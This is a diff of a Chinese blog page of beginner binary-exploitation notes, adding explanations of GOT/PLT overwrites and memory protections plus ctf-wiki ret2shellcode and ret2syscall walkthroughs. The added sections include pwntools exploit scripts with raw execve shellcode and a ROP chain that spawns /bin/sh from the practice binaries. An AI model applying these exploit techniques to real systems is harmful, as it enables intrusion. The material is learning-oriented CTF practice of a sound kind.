@@ -10,12 +10,12 @@
   <meta name="generator" content="hexo-theme-yilia-plus">
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
   
-  <meta name="description" content="pwn从0开始  多种ROP利用ret2text从ctfwiki上下载ret2text二进制程序，链接 使用checksec检查是否开启相关保护，可以看出，无地址随机化，无canary，仅仅开启了不可执行栈。该程序为32位程序，拖入IDA 32反汇编查看。  IDA反汇编后，查看main函数，F5生成源代码，gets()函数存在堆溢出  View-&gt;Open subviews-&gt;str">
+  <meta name="description" content="pwn从0开始  文章开始前，增加一个辅助视频以帮助了解基本堆栈结构和C语言程序运行时候的状态。  同时，补充一些基本知识 GOT和PLT  GOT：全局偏移量表，位于程序的数据段，每个条目8字节，用来存储外部函数（动态链接过来的那些函数）在内存里面的地址，可以在程序运行中被修改，这是因为默认情况下程序只有在需要调用时才导入函数，而不是在一开始就把所有需要用到的函数全部放进表里面。 PLT：过程链">
 <meta property="og:type" content="article">
 <meta property="og:title" content="basic-pwn">
 <meta property="og:url" content="https://username.github.io/2023/11/15/basic-pwn/index.html">
 <meta property="og:site_name" content="Hexo">
-<meta property="og:description" content="pwn从0开始  多种ROP利用ret2text从ctfwiki上下载ret2text二进制程序，链接 使用checksec检查是否开启相关保护，可以看出，无地址随机化，无canary，仅仅开启了不可执行栈。该程序为32位程序，拖入IDA 32反汇编查看。  IDA反汇编后，查看main函数，F5生成源代码，gets()函数存在堆溢出  View-&gt;Open subviews-&gt;str">
+<meta property="og:description" content="pwn从0开始  文章开始前，增加一个辅助视频以帮助了解基本堆栈结构和C语言程序运行时候的状态。  同时，补充一些基本知识 GOT和PLT  GOT：全局偏移量表，位于程序的数据段，每个条目8字节，用来存储外部函数（动态链接过来的那些函数）在内存里面的地址，可以在程序运行中被修改，这是因为默认情况下程序只有在需要调用时才导入函数，而不是在一开始就把所有需要用到的函数全部放进表里面。 PLT：过程链">
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="https://username.github.io/images/basic-pwn.assets/image-20231112154156552.png">
 <meta property="og:image" content="https://username.github.io/images/basic-pwn.assets/image-20231112155202026.png">
@@ -33,8 +33,19 @@
 <meta property="og:image" content="https://username.github.io/images/basic-pwn.assets/image-20231115023800150.png">
 <meta property="og:image" content="https://username.github.io/images/basic-pwn.assets/image-20231115023952729.png">
 <meta property="og:image" content="https://username.github.io/images/basic-pwn.assets/image-20231115031232593.png">
+<meta property="og:image" content="https://username.github.io/images/basic-pwn.assets/image-20231116234949317.png">
+<meta property="og:image" content="https://username.github.io/images/basic-pwn.assets/image-20231117015423484.png">
+<meta property="og:image" content="https://username.github.io/images/basic-pwn.assets/image-20231117021653780.png">
+<meta property="og:image" content="https://username.github.io/images/basic-pwn.assets/image-20231117024843769.png">
+<meta property="og:image" content="https://username.github.io/images/basic-pwn.assets/image-20231117025655190.png">
+<meta property="og:image" content="https://username.github.io/images/basic-pwn.assets/image-20231117030324644.png">
+<meta property="og:image" content="https://username.github.io/images/basic-pwn.assets/image-20231117030450390.png">
+<meta property="og:image" content="https://username.github.io/images/basic-pwn.assets/image-20231117032147479.png">
+<meta property="og:image" content="https://username.github.io/images/basic-pwn.assets/image-20231117031140755.png">
+<meta property="og:image" content="https://username.github.io/images/basic-pwn.assets/image-20231117031300711.png">
+<meta property="og:image" content="https://username.github.io/images/basic-pwn.assets/image-20231117032438162.png">
 <meta property="article:published_time" content="2023-11-14T19:25:02.000Z">
-<meta property="article:modified_time" content="2023-11-14T19:42:39.517Z">
+<meta property="article:modified_time" content="2023-11-16T19:33:15.327Z">
 <meta property="article:author" content="Isabella">
 <meta property="article:tag" content="pwn">
 <meta name="twitter:card" content="summary">
@@ -274,7 +285,7 @@
       <!-- 百度字体平台:http://fontstore.baidu.com/static/editor/index.html -->
       <i class="icon-statistics"></i>
       <span class="post-meta-item-text"> 字数统计:</span>
-      <span class="post-count">1k字</span>
+      <span class="post-count">2.6k字</span>
     </span>
   </span>
 
@@ -283,7 +294,7 @@
     <span class="post-meta-item-icon">
       <i class="icon-book icon"></i>
       <span class="post-meta-item-text"> 阅读时长≈</span>
-      <span class="post-count">4分</span>
+      <span class="post-count">9分</span>
     </span>
   </span>
 </div>
@@ -296,6 +307,44 @@
     
     <center>pwn从0开始</center>
 
+<p>文章开始前，增加一个辅助视频以帮助了解基本堆栈结构和C语言程序运行时候的状态。</p>
+<p><video src="../images/basic-pwn.assets/C语言程序的运行时结构.mp4" width = "600" height = "400"></video></p>
+<p>同时，补充一些基本知识</p>
+<p><strong>GOT和PLT</strong></p>
+<ul>
+<li>GOT：全局偏移量表，位于程序的数据段，每个条目8字节，用来存储外部函数（动态链接过来的那些函数）在内存里面的地址，可以在程序运行中被修改，这是因为默认情况下程序只有在需要调用时才导入函数，而不是在一开始就把所有需要用到的函数全部放进表里面。</li>
+<li>PLT：过程链接表：位于程序的代码段，每个条目16字节，前两条是特殊条目，分别用于跳转到动态链接器和记录系统启动函数，其余的条目负责调用一个具体的函数（存储外部函数的入口点，也就是这个函数在GOT表的位置）</li>
+<li>攻击流程：<ul>
+<li>确定printf函数在GOT表中的位置：程序在正常执行调用printf函数时通过PLT表跳转到GOT表的指定条目，此时可以通过对应的汇编指令看到这个位置（当然这样一来printf函数在内存中的实际地址也能知道）</li>
+<li>确定system函数在内存中的位置：开启堆栈随机化（ASLR）之后动态链接库在内存的位置是随机的，但是一个函数在其所在的链接库内部的相对地址是不变的，如果printf函数和system函数位于同一个动态链接库，那就可以通过printf在内存中的地址+两个函数在动态链接库内的偏移得到system函数在内存中的实际位置</li>
+<li>把system函数在内存中的位置值写入printf函数在GOT表中的位置</li>
+<li>程序调用printf函数时，通过PLT表跳转到GOT表的对应条目，但是那里已经被覆写，调用的函数实际上是system而不是printf</li>
+</ul>
+</li>
+</ul>
+<p><strong>RELRO</strong></p>
+<p>让重定位表只读，避免GOT被恶意修改。RERLO有两种形式：</p>
+<ul>
+<li>部分RELRO：.init_array、.fini_array、.jcr、.dynamic这些表一次性加载，然后变成只读；.got只读；.got.plt依然可写</li>
+<li>前部RELRO：全都不准写！这样会导致所有符号在程序开始的时候导入，性能和时间开销大</li>
+</ul>
+<p><strong>Stack Canary</strong></p>
+<p>函数执行之前在栈的EBP附近插入一个值，如果被溢出攻击，那这个值就有可能被覆盖</p>
+<p><strong>NX&#x2F;DEP</strong></p>
+<p>数据段不可执行，数据段可以执行，那么就可以将自己的代码随便放在数据段的某个变量里，然后再用溢出使得函数返回到那个数据段的起始地址。开启NX之后，如果程序发现自己返回到了数据段就会终止运行。因此衍生出了ROP攻击，即利用代码段自带的片段拼凑出攻击逻辑。</p>
+<p><strong>PIE</strong></p>
+<p>地址无关的可执行文件。</p>
+<p>正常情况下，内存是这样子的：</p>
+<ul>
+<li>内核虚拟地址空间（所有进程共享，但是用户空间代码不可见）</li>
+<li>栈：函数</li>
+<li>动态映射段（动态库在这里）</li>
+<li>堆：动态申请的变量</li>
+<li>BSS段：未初始化的变量</li>
+<li>数据段：静态&#x2F;全局变量</li>
+<li>代码段：汇编代码，还有一些字面值变量</li>
+</ul>
+<p>开启PIE之后，这些段全部打散，通过GOT来登记其实际位置。</p>
 <h2 id="多种ROP利用"><a href="#多种ROP利用" class="headerlink" title="多种ROP利用"></a>多种ROP利用</h2><h3 id="ret2text"><a href="#ret2text" class="headerlink" title="ret2text"></a>ret2text</h3><p>从ctfwiki上下载ret2text二进制程序，<a target="_blank" rel="noopener" href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/basic-rop/#ret2text">链接</a></p>
 <p>使用<code>checksec</code>检查是否开启相关保护，可以看出，无地址随机化，无canary，仅仅开启了不可执行栈。该程序为32位程序，拖入IDA 32反汇编查看。</p>
 <p><img src="/../images/basic-pwn.assets/image-20231112154156552.png" alt="image-20231112154156552"></p>
@@ -374,7 +423,48 @@
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">proc=process(<span class="string">&quot;./ret2shellcode&quot;</span>)</span><br><span class="line">shellcode=asm(shellcraft.sh())</span><br><span class="line"><span class="comment">#shellcode=b&quot;\x31\xc0\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xb0\x0b\xcd\x80&quot;</span></span><br><span class="line"><span class="comment">#payload=shellcode+b&quot;A&quot;*89+p32(0x0804a080)</span></span><br><span class="line">payload=shellcode+<span class="string">b&quot;A&quot;</span>*<span class="number">68</span>+p32(<span class="number">0x0804a080</span>)</span><br><span class="line">proc.recvline()</span><br><span class="line">proc.sendline(payload)</span><br><span class="line">proc.interactive()</span><br></pre></td></tr></table></figure>
 
 <p><img src="/../images/basic-pwn.assets/image-20231115031232593.png" alt="image-20231115031232593"></p>
-<p>很奇怪，EOF了，但是又好像getshell了</p>
+<p>很奇怪，EOF了.</p>
+<p>&#x3D;&#x3D;后记&#x3D;&#x3D;：后来了解到，原因是strncpy()写入的buf2在.bss段，自从Linux内核5.x之后，内存的BSS段默认没有可执行权限，该段上的权限是&#x3D;&#x3D;rw&#x3D;&#x3D;，并不是写入了stack里（stack为rwx，有执行权限），因此返回地址跳转到.bss段中的shellcode并执行，并不会真正的拿到shell。真正getshell方法较为困难，后续再探讨</p>
+<p><img src="/../images/basic-pwn.assets/image-20231116234949317.png" alt="image-20231116234949317"></p>
+<h3 id="ret2syscall"><a href="#ret2syscall" class="headerlink" title="ret2syscall"></a>ret2syscall</h3><p><img src="/../images/basic-pwn.assets/image-20231117015423484.png" alt="image-20231117015423484"></p>
+<p>直接<code>checksec</code>，开启了NX，IDA反汇编main函数</p>
+<p><img src="/../images/basic-pwn.assets/image-20231117021653780.png" alt="image-20231117021653780"></p>
+<p>同样利用ret2shellcode的方法计算出返回地址距离v4的偏移仍为108+4</p>
+<p><img src="/../images/basic-pwn.assets/image-20231117024843769.png" alt="image-20231117024843769"></p>
+<p>这里使用ROP技术进行攻击，ROP的全称为Return-oriented Programming（返回导向编程），这是一种高级的内存攻击技术，攻击者扫描已有的动态链接库和可执行文件，提取出可以利用的指令片段(gadget)，这些指令片段均以ret指令结尾，即用ret指令实现指令片段执行流的衔接，从而构建恶意代码。可以用来绕过现代操作系统的各种通用防御（比如内存不可执行和代码签名等）。</p>
+<p>常见的利用方法是使用系统调用获得shell</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">execve(<span class="string">&quot;/bin/sh&quot;</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>)</span><br></pre></td></tr></table></figure>
+
+<p>其中，该程序是 32 位，所以我们需要使得</p>
+<ul>
+<li>系统调用号，即 eax 应该为 0xb，即execve()函数的系统调用号</li>
+<li>第一个参数，即 ebx 应该指向 &#x2F;bin&#x2F;sh 的地址</li>
+<li>第二个参数，即 ecx 应该为 0</li>
+<li>第三个参数，即 edx 应该为 0</li>
+</ul>
+<p>&#x3D;&#x3D;这里待定，使用COMPILER EXPLORER编译结果使用的不是这几个寄存器&#x3D;&#x3D;<img src="/../images/basic-pwn.assets/image-20231117025655190.png" alt="image-20231117025655190"></p>
+<p>补上<code>vmmap</code>情况</p>
+<p><img src="/../images/basic-pwn.assets/image-20231117030324644.png" alt="image-20231117030324644"></p>
+<p>首先查找汇编指令为<code>pop eax</code>，后续接<code>ret</code>的命令</p>
+<p><img src="/../images/basic-pwn.assets/image-20231117030450390.png" alt="image-20231117030450390"></p>
+<p>使用<code>0x080bb196</code> 的地址，值得注意的是，该部分代码段有执行权限，因为我们不需要写入权限，仅仅需要ret地址为下一条目标指令即可，顺次拼接。</p>
+<p><img src="/../images/basic-pwn.assets/image-20231117032147479.png" alt="image-20231117032147479"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0x08048913 : pop ebx ; pop esi ; pop edi ; ret</span><br><span class="line">0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret</span><br></pre></td></tr></table></figure>
+
+<p>为了验证上述黄色猜想，选择这两条分别测试，其中第二条为wp选择</p>
+<p>接下来寻找字符串”&#x2F;bin&#x2F;sh”所在地址</p>
+<p><img src="/../images/basic-pwn.assets/image-20231117031140755.png" alt="image-20231117031140755"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x080be408 : /bin/sh</span><br></pre></td></tr></table></figure>
+
+<p>最后一条是int 0x80系统调用地址</p>
+<p><img src="/../images/basic-pwn.assets/image-20231117031300711.png" alt="image-20231117031300711"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x08049421 : int 0x80</span><br></pre></td></tr></table></figure>
+
+<p>将上述地址拼接起来，构成payload</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">&#x27;./rop&#x27;</span>)</span><br><span class="line">pop_eax_ret = <span class="number">0x080bb196</span></span><br><span class="line">pop_edx_ecx_ebx_ret = <span class="number">0x0806eb90</span></span><br><span class="line">int_0x80 = <span class="number">0x08049421</span></span><br><span class="line">bin_sh = <span class="number">0x80be408</span></span><br><span class="line">payload = flat(</span><br><span class="line">    [<span class="string">b&#x27;A&#x27;</span> * <span class="number">112</span>, pop_eax_ret, <span class="number">0xb</span>, pop_edx_ecx_ebx_ret, <span class="number">0</span>, <span class="number">0</span>, bin_sh, int_0x80])</span><br><span class="line">sh.recvuntil(<span class="string">&quot;What do you plan to do?\n&quot;</span>)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>最后测试结果，只有pop_edx_ecx_ebx_ret可以getshell，有点奇怪</p>
+<p><img src="/../images/basic-pwn.assets/image-20231117032438162.png" alt="image-20231117032438162"></p>
 
     
 
@@ -513,6 +603,15 @@
 
 
 <nav id="article-nav">
+  
+    <a href="/2023/11/16/Pytorch%E5%AD%A6%E4%B9%A0/" id="article-nav-newer" class="article-nav-link-wrap">
+      <i class="icon-circle-left"></i>
+      <div class="article-nav-title">
+        
+          Pytorch学习
+        
+      </div>
+    </a>
   
   
     <a href="/2021/03/07/CTF-web%E5%AD%A6%E4%B9%A0/" id="article-nav-older" class="article-nav-link-wrap">
@@ -729,6 +828,10 @@
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color4">pwn</a>
               </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">neural network</a>
+              </li>
             
             <div class="clearfix"></div>
           </ul>
@@ -780,21 +883,21 @@
           
             <li class="search-li">
               <a href="https://Isabella2inori.github.io" target="_blank" 
-                class="search-title" title="记录工作和学习过程中的笔记：Java、前端开发、Hexo博客、聚合支付、Linux笔记、ElasticSearch、ELK日志分析">
+                class="search-title" title="老废物的牛马自我修养">
                 
                   <img src="https://gravatar.loli.net/avatar/2893555f825ca98b73daffff0afc2866?s=200&d=mp&r=g">
                 
-                技术笔记
+                Myself
               </a>
             </li>
           
             <li class="search-li">
-              <a href="https://github.com/Isabella2inori" target="_blank" 
+              <a href="https://fsjz2020.github.io" target="_blank" 
                 class="search-title" >
                 
-                  <i class="icon-link icon"></i>
+                  <img src="https://fsjz2020.github.io/images/icon.png">
                 
-                GitHub
+                FSJZ
               </a>
             </li>
           
